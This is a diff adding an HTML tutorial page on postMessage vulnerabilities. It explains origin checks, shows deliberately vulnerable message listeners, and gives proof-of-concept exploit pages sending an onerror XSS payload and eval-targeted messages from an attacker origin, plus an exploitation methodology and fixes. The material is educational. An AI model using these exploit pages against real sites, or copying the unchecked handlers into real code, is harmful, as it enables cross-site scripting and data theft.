@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>redcolour — postMessage Vulnerabilities</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap');
+  
+
+    pre code.no-highlight {
+      background: transparent;
+      border: none;
+      padding: 0;
+    }
+    pre code.no-highlight:hover {
+      transform: none;
+    }
+
+    :root {
+      --bg-primary: #0a0a0f;
+      --bg-secondary: #15151e;
+      --text-primary: #e0e0e0;
+      --text-secondary: #a0a0b0;
+      --accent-primary: #ff3366;
+      --accent-secondary: #eeff33;
+      --code-inline-bg: rgba(255, 51, 102, 0.15);
+      --code-inline-border: rgba(255, 51, 102, 0.3);
+      --code-block-bg: #15151e;
+      --code-block-border: #2a2a3a;
+      --code-block-glow: rgba(170, 51, 255, 0.2);
+      --header-gradient: linear-gradient(135deg, #ff3366, #ff3366);
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      line-height: 1.7;
+      min-height: 100vh;
+      padding: 0;
+      margin: 0;
+      overflow-x: hidden;
+    }
+    
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem;
+      position: relative;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 2rem;
+      background: var(--header-gradient);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-align: center;
+      font-weight: 800;
+      letter-spacing: -0.05em;
+      line-height: 1.2;
+      position: relative;
+      padding-bottom: 1rem;
+      text-decoration: none;
+    }
+    
+    h2 {
+      font-size: 1.8rem;
+      margin: 3rem 0 1.5rem;
+      color: var(--accent-secondary);
+      font-weight: 700;
+      position: relative;
+      padding-bottom: 0.5rem;
+    }
+    
+    h2::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 60px;
+      height: 2px;
+      background: var(--accent-secondary);
+      opacity: 0.5;
+    }
+    
+    h3 {
+      font-size: 1.4rem;
+      margin: 2rem 0 1rem;
+      color: var(--accent-primary);
+      font-weight: 600;
+    }
+    
+    p {
+      margin-bottom: 1.5rem;
+      color: var(--text-primary);
+    }
+    
+    a {
+      color: var(--accent-secondary);
+      text-decoration: none;
+      transition: all 0.2s ease;
+      position: relative;
+    }
+    
+    a:hover {
+      color: var(--accent-primary);
+      text-decoration: underline;
+    }
+    
+    a::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      width: 0;
+      height: 2px;
+      background: var(--accent-primary);
+      transition: width 0.3s ease;
+    }
+    
+    a:hover::after {
+      width: 100%;
+    }
+    
+    ul, ol {
+      margin-bottom: 1.5rem;
+      padding-left: 1.5rem;
+    }
+    
+    li {
+      margin-bottom: 0.5rem;
+      color: var(--text-secondary);
+    }
+    
+    li::marker {
+      color: var(--accent-primary);
+    }
+    
+    code:not(pre code) {
+      font-family: 'JetBrains Mono', monospace;
+      background-color: var(--code-inline-bg);
+      color: var(--accent-primary);
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-size: 0.9em;
+      border: 1px solid var(--code-inline-border);
+      transition: all 0.2s ease;
+    }
+    
+    code:not(pre code):hover {
+      background-color: rgba(255, 51, 102, 0.25);
+      transform: translateY(-1px);
+    }
+    
+    pre {
+      background-color: var(--code-block-bg);
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      border: 1px solid var(--code-block-border);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      position: relative;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    pre:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+    }
+    
+    pre::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      border-radius: 8px;
+      background: radial-gradient(600px circle at var(--x, -100%) var(--y, -100%), 
+                  var(--code-block-glow), transparent 70%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+      z-index: 0;
+    }
+    
+    pre:hover::before {
+      opacity: 1;
+    }
+    
+    pre code {
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--text-primary);
+      background: transparent;
+      padding: 0;
+      border: none;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      display: block;
+      position: relative;
+      z-index: 1;
+    }
+    
+
+    pre {
+      background-color: rgba(25, 25, 35, 0.7);
+      border-left: 4px solid var(--accent-secondary);
+      padding: 1rem;
+    }
+    
+    p + pre code {
+      font-size: 0.9rem;
+    }
+    
+
+    .keyword { color: #ff7faa; }
+    .string { color: #66ff99; }
+    .number { color: #ffcc66; }
+    .comment { color: #8888aa; font-style: italic; }
+    .function { color: #66ccff; }
+    .operator { color: #ff9966; }
+    
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+      margin: 2rem auto;
+      display: block;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      border: 1px solid var(--code-block-border);
+    }
+    
+
+    .disclaimer {
+      margin-top: 3rem;
+      padding-top: 2rem;
+      border-top: 1px solid var(--code-block-border);
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+    
+
+    @media (max-width: 768px) {
+
+  .container {
+    max-width: 100%;
+    padding: 1.5rem 1rem;
+  }
+
+
+  h1 {
+    font-size: 1.8rem;
+    margin-bottom: 1.5rem;
+    text-align: center;
+  }
+  h2 {
+    font-size: 1.4rem;
+    margin: 1.5rem 0 1rem;
+  }
+  h3 {
+    font-size: 1.1rem;
+    margin: 1rem 0 0.75rem;
+  }
+
+
+  p {
+    font-size: 1rem;
+    line-height: 1.5;
+    margin-bottom: 1.25rem;
+  }
+
+  ul, ol {
+    padding-left: 1.25rem;
+    margin-bottom: 1rem;
+  }
+
+  code:not(pre code) {
+    font-size: 0.9rem;
+  }
+
+  pre {
+    font-size: 0.85rem;
+    padding: 1rem;
+    overflow-x: auto;
+    white-space: pre-wrap; 
+    word-break: break-word; 
+  }
+
+  a {
+    font-size: 1rem;
+    word-break: break-word;
+  }
+
+  ::-webkit-scrollbar {
+    width: 6px;
+    height: 6px;
+  }
+}
+
+    
+    ::-webkit-scrollbar {
+      width: 10px;
+      height: 10px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: var(--bg-secondary);
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: var(--accent-primary);
+      border-radius: 5px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+      background: #ff1a4d;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>postMessage Vulnerabilities</h1>
+    
+    <h2>Introduction</h2>
+    <p>Before you learn about postMessage, you need to know what SOP is. Here is a brief definition:</p>
+    <p><strong>The Same-Origin Policy (SOP):</strong><br>
+    A security rule that prevents scripts from one website (origin) from accessing data from another website (another origin). It protects user sessions and sensitive data from malicious websites.</p>
+
+    <p>So, SOP basically prevents Cross-Origin Communication. However, Modern web applications often need to communicate between different domains (e.g., Google services like Gmail and YouTube). This is made possible by features like CORS, which is used to control access to resources (like APIs) from different domains and is primarily about controlling how browsers handle HTTP requests. postMessage is similar, it's used to communicate safely between different windows or frames across different origins, without the need for an HTTP request.</p>
+
+    <h2>postMessage</h2>
+    <p>A built-in JavaScript API that basically lets different pages or windows, or iFrames send messages to each other even if they're from different origins. The simplest way to think of them is a pathway for two browser frames to communicate. "What is a frame?" You might ask? A frame is a:</p>
+    <ul>
+      <li>Browser tab</li>
+      <li><code>&lt;iframe&gt;</code> frame</li>
+      <li><code>&lt;portal&gt;</code> frame (not yet fully released)</li>
+    </ul>
+    <p>You can read more about it in detail <a href="#">here</a>.</p>
+
+    <p><code>postMessage()</code> has built-in safety features:</p>
+    <p>When sending a message, you can specify the target origin (the website you want to send the message to):</p>
+    <pre><code class="literal">targetWindowName.postMessage("Hello, world!", "https://trusted-site.com");</code></pre>
+
+    <p>When receiving messages, you can check the origin of the message to make sure it came from a trusted source. The receiving window listens for the message using an event listener:</p>
+    <pre><code>window.addEventListener('message', function(event) {
+    if (event.origin === 'https://trusted-site.com') {
+        console.log('Safe message:', event.data);
+    } else {
+        console.log('Blocked message from:', event.origin);
+    }
+});</code></pre>
+
+    <p>Let's understand more with a real example:</p>
+
+    <h3>example 1: A Page Talking to a Popup It Opened</h3>
+    <p>Imagine you're on a website, and you click "Login with Google". A popup window opens where you log in. Once you're logged in, the popup needs to tell the original page that you're logged in.</p>
+
+    <p><strong>Without postMessage():</strong><br>
+    The main page and the popup can't communicate because they are from different websites (your site and Google's site).</p>
+    <p><strong>With postMessage():</strong><br>
+    The popup can send a message back to the main page to say, "Hey, the user logged in successfully!"</p>
+
+    <h3>example 2: A Page Talking to an Iframe</h3>
+    <p>Let's say you embed a YouTube video on your blog using an iframe. The YouTube player might need to send messages to your blog, like telling it when the video starts playing or when it's paused.</p>
+
+    <p><strong>Without postMessage():</strong><br>
+    Your page and the YouTube iframe can't share data because they come from different origins.</p>
+    <p><strong>With postMessage():</strong><br>
+    The YouTube iframe can send messages to your blog page, like "The video has started playing."</p>
+
+    <h2>Problems</h2>
+    <p>Can you understand why this could cause a problem? If postMessage is not used properly, like not validating the message's origin when receiving data, it can lead to security risks like DOM-based XSS or Information Disclosure.</p>
+
+    <h3>DOM-based XSS via postMessage</h3>
+    <p>Let's say the target site (https://vulnerable-site.com/) has the following code:</p>
+    <pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Vulnerable Site&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Vulnerable Site&lt;/h1&gt;
+    &lt;div id="content"&gt;&lt;/div&gt;
+
+    &lt;script&gt;
+        // Listen for messages from any origin
+        window.addEventListener("message", function(event) {
+            // No origin validation
+            document.getElementById("content").innerHTML = event.data; // Dangerous: Inserts raw HTML
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <h4>What's Wrong Here?</h4>
+    <p>The site listens for messages using postMessage but:</p>
+    <ul>
+      <li>It doesn't validate the origin of the message (event.origin).</li>
+      <li>It directly inserts the message data into the DOM using innerHTML, which is unsafe.</li>
+    </ul>
+
+    <h4>How the Attacker Discovers the Vulnerability (Example scenario)</h4>
+
+    <p><strong>Step 1: Reconnaissance</strong><br>
+    The attacker visits https://vulnerable-site.com/ and inspects the JavaScript code using the browser's Developer Tools (F12). The attacker then searches for postMessage or addEventListener("message") in the Sources tab (Global listeners -> message -> js code). There are tools to help detect postMessage events.</p>
+
+    <p><strong>Step 2: Identifying the Flaw</strong><br>
+    The attacker finds the following code:</p>
+    <pre><code>window.addEventListener("message", function(event) {
+    document.getElementById("content").innerHTML = event.data; // Dangerous!
+});</code></pre>
+    <p>The attacker notices:</p>
+    <ul>
+      <li>No origin validation (event.origin is not checked, nothing checks where the message came from).</li>
+      <li>The message data is inserted directly into the DOM using innerHTML. He can use developer tools to debug and test the EventListener. The attacker could try pasting this in his console:</li>
+    </ul>
+    <pre><code>window.dispatchEvent(new MessageEvent("message", {
+  origin: "https://www.google.com",
+  data: "alert(document.domain)"
+}));</code></pre>
+    <p>This will send a message to the event listener containing the origin & malicious data, which will get inserted into the DOM because of the dangerous use of the innerHTML element in the code. Of course, the testing works perfectly and smoothly for the attacker in this scenario.</p>
+
+    <p><strong>Step 3: How the Attacker Sets Up the Attack</strong><br>
+    The attacker creates a simple test page (Let's call it https://hacker.com/) to send a message to the target site:</p>
+    <pre><code>&lt;script&gt;
+    var targetWindow = window.open("https://vulnerable-site.com"); // this opens a popup window of vulnerable-site.com
+    setTimeout(function() {
+        targetWindow.postMessage("&lt;h1&gt;test Message&lt;/h1&gt;", "*");
+    }, 2000);
+&lt;/script&gt;</code></pre>
+    <p>If the target site displays the message (&lt;h1&gt;test Message&lt;/h1&gt;), the attacker confirms that the site is vulnerable.<br>
+    Now, the attacker creates a malicious payload to inject a script into the target site.</p>
+    <pre><code>&lt;img src="x" onerror="alert('XSS Attack!')"&gt;</code></pre>
+    <p>This payload uses an &lt;img&gt; tag with a broken src attribute (x), which triggers the onerror event handler. The onerror handler executes the malicious script (alert('XSS Attack!')).</p>
+
+    <p>This is how the hacker's site (https://hacker.com/) would look like:</p>
+    <pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Click the Button to Exploit&lt;/h1&gt;
+    &lt;button onclick="exploit()"&gt;Exploit&lt;/button&gt;    
+    &lt;script&gt;
+        function exploit() {
+            // Open the target site in a new window
+            var targetWindow = window.open("https://vulnerable-site.com");
+            // Wait for the page to load
+            setTimeout(function() {
+                // Send the malicious payload
+                targetWindow.postMessage(
+                    '&lt;img src="x" onerror="alert(\'XSS Attack!\')"&gt;',
+                    "*"
+                );
+            }, 2000);
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <h4>Summary on how the Dom-based XSS Attack Executes</h4>
+
+    <p><strong>Step 1: The Victim Visits the Malicious Site</strong><br>
+    The victim visits the attacker's malicious site (exploit.html).<br>
+    The site displays a button labeled "Exploit".</p>
+
+    <p><strong>Step 2: The Victim Clicks the Button</strong><br>
+    When the victim clicks the button, the exploit() function is triggered:<br>
+    The target site (https://vulnerable-site.com/) is opened in a new window.<br>
+    After 2 seconds, the malicious payload is sent to the target site using postMessage.</p>
+
+    <p><strong>Step 3: The Target Site Processes the Message</strong><br>
+    The target site receives the message and processes it:</p>
+    <pre><code>window.addEventListener("message", function(event) {
+    document.getElementById("content").innerHTML = event.data; // Inserts the malicious payload
+});</code></pre>
+    <p>The malicious payload (&lt;img src="x" onerror="alert('XSS Attack!')"&gt;) is inserted into the DOM.</p>
+
+    <p><strong>Step 4: The Malicious Script Executes</strong><br>
+    The &lt;img&gt; tag is added to the DOM, but the src attribute is invalid (x), so the onerror event handler is triggered.</p>
+    <p>The onerror handler executes the malicious script:</p>
+    <pre><code>alert('XSS Attack!');</code></pre>
+    <p>The impact of an XSS as you know depends on the target.</p>
+
+    <h3>Information Disclosure via postMessage</h3>
+    <p>While XSS is about executing code, Information Disclosure is about leaking data. Both can happen if postMessage is used incorrectly, but they are distinct issues. This happens when sensitive data (e.g., session tokens, payment details) is exposed to unauthorized parties because the origin of the message is not validated or the data is sent to a wildcard origin ("*")</p>
+
+    <h4>Example: Information Disclosure via postMessage</h4>
+    <p>Let's say the target site (https://vulnerable-site.com/) has the following code:</p>
+    <pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Vulnerable Site&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Vulnerable Site&lt;/h1&gt;
+    &lt;iframe id="paymentFrame" src="https://payment-provider.com"&gt;&lt;/iframe&gt;
+
+    &lt;script&gt;
+        // Listen for messages from the payment iframe
+        window.addEventListener("message", function(event) {
+            // No origin validation
+            console.log("Payment data received:", event.data); // Logs sensitive payment data
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+    <h4>What's wrong here?</h4>
+    <ul>
+      <li>It doesn't validate the origin of the message (event.origin)</li>
+      <li>It logs sensitive payment data (e.g., credit card details, transaction IDs) to the console.</li>
+      <li>If the payment iframe sends sensitive data to a wildcard origin, an attacker can intercept it.</li>
+    </ul>
+
+    <h4>How the Attacker Discovers the Vulnerability</h4>
+
+    <p><strong>Step 1: Reconnaissance</strong><br>
+    The attacker visits https://vulnerable-site.com and inspects the JavaScript code using the browser's Developer Tools (F12).<br>
+    The attacker searches for postMessage or addEventListener("message") in the Sources tab.</p>
+
+    <p><strong>Step 2: Identifying the Flaw</strong><br>
+    The attacker finds the following code:</p>
+    <pre><code>window.addEventListener("message", function(event) {
+    console.log("Payment data received:", event.data); // Logs sensitive data
+});</code></pre>
+    <p>The attacker notices:</p>
+    <ul>
+      <li>No origin validation (event.origin is not checked).</li>
+      <li>Sensitive data is being logged or processed without proper security checks.</li>
+    </ul>
+
+    <p><strong>Step 3: Confirming the Vulnerability</strong><br>
+    The attacker creates a simple test page (let's call it https://hacker.com) to send a message to the target site:</p>
+    <pre><code>&lt;script&gt;
+    var targetWindow = window.open("https://vulnerable-site.com"); // Opens a popup window of vulnerable-site.com
+    setTimeout(function() {
+        // Send a fake payment message
+        targetWindow.postMessage(
+            { cardNumber: "1234-5678-9012-3456" },
+            "*" // Wildcard origin (vulnerable)
+        );
+    }, 2000);
+&lt;/script&gt;</code></pre>
+    <p>If the target site logs the payment data ({ cardNumber: "1234-5678-9012-3456" }), the attacker confirms that the site is vulnerable.</p>
+
+    <h4>How the Attack Executes</h4>
+
+    <p><strong>Step 1:</strong><br>
+    The victim visits the attacker's malicious site (https://hacker.com).<br>
+    The site displays a button labeled "Exploit".</p>
+
+    <p><strong>Step 2:</strong><br>
+    When the victim clicks the button, the exploit() function is triggered:<br>
+    The target site (https://vulnerable-site.com) is opened in a new window.<br>
+    After 2 seconds, the attacker sends a fake payment message to the target site using postMessage.</p>
+
+    <p><strong>Step 3: The Target Site Processes the Message</strong><br>
+    The target site receives the message and processes it:</p>
+    <pre><code>window.addEventListener("message", function(event) {
+    console.log("Payment data received:", event.data); // Logs the fake payment data
+});</code></pre>
+    <p>The payment data ({ cardNumber: "1234-5678-9012-3456" }) is logged to the console.</p>
+
+    <p><strong>Step 4: The Attacker Intercepts Sensitive Data</strong><br>
+    The attacker's malicious site listens for messages from the target site:</p>
+    <pre><code>window.addEventListener("message", function(event) {
+    if (event.origin === "https://vulnerable-site.com") {
+        console.log("Intercepted payment data:", event.data); // Logs the stolen data
+    }
+});</code></pre>
+    <p>If the target site sends sensitive data back to the attacker's site, the attacker can intercept it.</p>
+
+    <h3>How to Fix the Vulnerabilities</h3>
+    <p><strong>Step 1: Validate the Origin.</strong><br>
+    Update the target site's code to validate the origin of incoming messages.</p>
+    <p><strong>Step 2: Avoid Using Wildcards.</strong> Always specify the exact targetOrigin when sending messages.</p>
+
+    <h2>Methodology</h2>
+    <ol>
+      <li><strong>Detecting postMessage Usage</strong><br>
+      Use tools like postMessage-tracker or Burp Suite DOM Invader as you browse the target application. These loggers will capture any calls to postMessage(…), showing you when and how the app is sending messages between windows or iframes.</li>
+      
+      <li><strong>Examining the targetOrigin Parameter</strong><br>
+      Whenever you see code like:</li>
+    </ol>
+    <pre><code>otherWindow.postMessage(message, targetOrigin);</code></pre>
+    <p>focus on the targetOrigin value. There are two risky cases:</p>
+    <p><strong>Wildcard ("*"):</strong></p>
+    <pre><code>otherWindow.postMessage(someData, "*");  // Any site can receive this message.</code></pre>
+    <p>With "*", the browser doesn't check where the message is going. That means any page, yours included, could intercept it.</p>
+
+    <p><strong>An Origin You Control:</strong></p>
+    <pre><code>otherWindow.postMessage(someData, "https://attacker.example.com");</code></pre>
+    <p>If targetOrigin matches sets an origin incorrectly, (like trusting any domain that contains "example.com" you could simply make a domain with subdomains like "example.com.evilsite.com" and that would bypass their flawed targetOrigin checks. Basically, if it sends data to any domain you own, and the target page is sending the message to a window that you actually control, you'll receive and read that data.</p>
+
+    <p>Here's are other ways on how you might end up "controlling" the target window:</p>
+
+    <p><strong>window.opener scenario:</strong><br>
+    If the target page was opened from your site (e.g., via window.open("https://victim.com")), then victimWindow.opener points back to you. Whenever victimWindow does postMessage(…, "https://your-site.com"), you'll get the message in your original window.</p>
+
+    <p><strong>Iframe hijack scenario:</strong><br>
+    If the target page embeds an iframe (e.g. &lt;iframe src="https://victim.com/inner"&gt;&lt;/iframe&gt;) and that page can be framed (no X-Frame-Options or strict CSP), you could:</p>
+    <ul>
+      <li>Load the target page on your own domain.</li>
+      <li>Replace or override the iframe's src to point to your page, but keep the same iframe reference name.</li>
+      <li>When the target page tries to send to that iframe, it's actually messaging your page, so you intercept the data.</li>
+    </ul>
+
+    <ol start="3">
+      <li><strong>Verifying Message Listener Origin Checks</strong><br>
+      Search for code that listens for incoming messages, such as:</li>
+    </ol>
+    <pre><code>window.addEventListener("message", function(e) {
+    // handler logic…
+});</code></pre>
+    <p>or</p>
+    <pre><code>document.onmessage = function(e) {
+    // handler logic…
+};</code></pre>
+    <p>Inside the handler, check whether the script does something like:</p>
+    <pre><code>if (e.origin !== "https://expected-domain.com") {
+    return; // drop the message
+}</code></pre>
+    <p>A robust check should compare e.origin against a hardcoded expected origin (e.g., "https://trusted.com") or against window.location.origin.<br>
+    Do not trust window.origin, because an attacker can send a message with an origin of "null" (e.g., from a sandboxed iframe), and some naive checks will accept it.</p>
+
+    <p>If the code uses anything less strict like simply seeing if e.origin "exists" or matches a non-specific pattern, it's vulnerable.</p>
+
+    <ol start="4">
+      <li><strong>Finding Dangerous "Sinks" for e.data</strong><br>
+      Once you identify a listener with weak or missing origin checks, test by sending messages from your own origin. Open the browser console on your attacker-controlled page and do:</li>
+    </ol>
+    <pre><code>victimWindow.postMessage({ foo: "bar" }, "https://victim.com");</code></pre>
+    <p>Then use breakpoints or console.log inside the victim's message handler to see what happens to e.data. Specifically look for code that does things like:</p>
+    <pre><code>eval(e.data);
+
+window.location = "javascript:" + e.data;</code></pre>
+    <p>Inserting e.data directly into innerHTML or similar DOM APIs without sanitization.</p>
+
+    <p>Keep in mind that postMessage can only send data types allowed by the Structured Clone Algorithm. You can't send a function, but you can send strings, objects, arrays, Dates, even Blobs—so you have plenty of flexibility to craft a payload.</p>
+
+    <ol start="5">
+      <li><strong>Building an Exploit</strong><br>
+      As soon as you find a handler that:</li>
+    </ol>
+    <ul>
+      <li>Doesn't correctly check e.origin, and</li>
+      <li>Passes e.data into a dangerous sink (like eval),</li>
+    </ul>
+    <p>you can create a simple attacker-controlled HTML page—hosted on a different origin—to exploit it. Your exploit might look like:</p>
+    <pre><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;button id="openTarget"&gt;Open Victim&lt;/button&gt;
+    &lt;script&gt;
+      document
+        .getElementById("openTarget")
+        .addEventListener("click", function() {
+          // Open the victim page in a new window
+          const victimWin = window.open("https://victim.com");
+          
+          // Wait briefly (or listen for load) before sending
+          setTimeout(() => {
+            victimWin.postMessage("maliciousCode()", "https://victim.com");
+          }, 500);
+        });
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+    <p><strong>Iframing (if allowed):</strong><br>
+    If the victim page can be framed, you could embed it inside your page directly and post messages to it without needing a user click. However, note that cookies or authentication tokens may not travel through an iframe in all configurations (e.g., if SameSite or cookie flags block them).</p>
+
+    <p><strong>Popup approach:</strong><br>
+    Using window.open after a button click ensures the browser lets you send messages to the new window. Once you hold a reference to victimWin, call victimWin.postMessage(…) with your crafted payload.</p>
+
+    <h3>Putting It All Together</h3>
+    <ol>
+      <li>Find any postMessage calls (logger tools will list them).</li>
+      <li>Check their targetOrigin—flag "*" or any domain you control.</li>
+      <li>Inspect message listeners on the victim site: do they properly compare e.origin to a single trusted origin?</li>
+      <li>Trace the code path of e.data in the handler—look for eval, location =, or unsafe DOM insertion.</li>
+      <li>Exploit by hosting a malicious page on another origin, opening or framing the victim, then sending a crafted message to run arbitrary code.</li>
+    </ol>
+    <p>With these steps, you'll methodically uncover and exploit any flawed postMessage implementation.</p>
+
+    <h2>PRACTICE TIME</h2>
+    <p><strong>Portswigger Labs:</strong><br>
+    <a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source">https://portswigger.net/web-security/dom-based/controlling-the-web-message-source</a><br>
+    Sinks located inside a PostMessage handler missing a proper origin check, can you test for it?</p>
+    <p><a href="https://public-firing-range.appspot.com/dom/index.html">https://public-firing-range.appspot.com/dom/index.html</a> (postMessage section)</p>
+    <p><em>Will be adding more later.</em></p>
+
+    <h2>RESOURCES</h2>
+    <ul>
+      <li><a href="https://x.com/Rhynorater/status/1683821173677727747">https://x.com/Rhynorater/status/1683821173677727747</a> + <a href="https://rhynorater.github.io/postMessage-Braindump">https://rhynorater.github.io/postMessage-Braindump</a></li>
+      <li><a href="https://book.jorianwoltjer.com/languages/javascript/postmessage-exploitation">https://book.jorianwoltjer.com/languages/javascript/postmessage-exploitation</a></li>
+      <li><a href="https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html">https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html</a></li>
+      <li><a href="https://drive.google.com/file/d/1yjeVzEQJt03s_zHFM9OQJyhIQsTmyrsA/view">https://drive.google.com/file/d/1yjeVzEQJt03s_zHFM9OQJyhIQsTmyrsA/view</a></li>
+    </ul>
+    <p><em>Will be adding more later.</em></p>
+
+    <h2>VIDEO RESOURCES</h2>
+    <ul>
+      <li><a href="https://www.youtube.com/watch?v=FTeE3OrTNoA">https://www.youtube.com/watch?v=FTeE3OrTNoA</a></li>
+    </ul>
+    <p><em>Will be adding more later.</em></p>
+
+    <div class="disclaimer" style="margin-top: 3rem;">
+      <h2>Disclaimer</h2>
+      <p>This started as personal notes from my web hacking journey. I cleaned them up in case they help others too.</p>
+      <p>If you're learning too and want to connect:</p>
+      <ul style="list-style: none; padding-left: 0; margin-top: 0.5rem;">
+        <li>🐦 <a href="https://x.com/Symibot" target="_blank" rel="noopener noreferrer" style="color: inherit; text-decoration: underline;">@Symibot on Twitter/X</a></li>
+        <li>💬 Discord: <code>symibot</code></li>
+      </ul>
+    </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // 1. First process all regular code blocks (for syntax highlighting)
+    document.querySelectorAll('pre code:not(.literal)').forEach((code) => {
+      // Apply glow effect
+      const pre = code.closest('pre');
+      pre.addEventListener('mousemove', (e) => {
+        const rect = pre.getBoundingClientRect();
+        pre.style.setProperty('--x', `${e.clientX - rect.left}px`);
+        pre.style.setProperty('--y', `${e.clientY - rect.top}px`);
+      });
+      pre.addEventListener('mouseleave', () => {
+        pre.style.setProperty('--x', '-100%');
+        pre.style.setProperty('--y', '-100%');
+      });
+
+      // Apply syntax highlighting
+      if (!code.dataset.highlighted) {
+        const rawText = code.textContent;
+        code.innerHTML = '';
+        code.appendChild(document.createTextNode(rawText));
+        code.dataset.highlighted = true;
+      }
+    });
+
+    // 2. For literal code blocks, render exactly as written
+    document.querySelectorAll('pre code.literal').forEach((code) => {
+      // Completely bypass any processing
+      const rawText = code.textContent;
+      code.innerHTML = '';
+      code.appendChild(document.createTextNode(rawText));
+      
+      // Still allow glow effect
+      const pre = code.closest('pre');
+      pre.addEventListener('mousemove', (e) => {
+        const rect = pre.getBoundingClientRect();
+        pre.style.setProperty('--x', `${e.clientX - rect.left}px`);
+        pre.style.setProperty('--y', `${e.clientY - rect.top}px`);
+      });
+      pre.addEventListener('mouseleave', () => {
+        pre.style.setProperty('--x', '-100%');
+        pre.style.setProperty('--y', '-100%');
+      });
+    });
+  });
+  </script>
+  
+
+</body>
+</html>
